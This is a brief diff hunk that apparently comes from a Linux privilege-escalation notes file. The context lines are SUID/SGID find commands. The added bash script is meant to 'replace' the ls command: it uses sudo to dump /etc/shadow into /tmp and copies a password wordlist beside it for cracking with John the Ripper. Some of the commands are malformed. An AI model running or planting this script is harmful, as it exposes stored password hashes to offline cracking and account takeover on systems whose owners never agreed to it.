@@ -92,7 +92,14 @@ find / -type f perm /2000 -ls 2>/dev/null               #find SGID
 find / -type f perm /6000 -ls 2>/dev/null               #Find both
 
 
+#Replacement for ls command to get /etc/shadow and a word list to john the ripper for passwords
+        #this script gives working results
 
+#!/bin/bash
+
+sudo cat /etc/shadow > /tmp/no_work.txt
+cat /home/billybob/10-million-password-list-top-10000.txt > /tmp/why.txt
+cp /home/billybob/10-million-password-list-top-10000.txt /tmp/this.txt
 
 
 
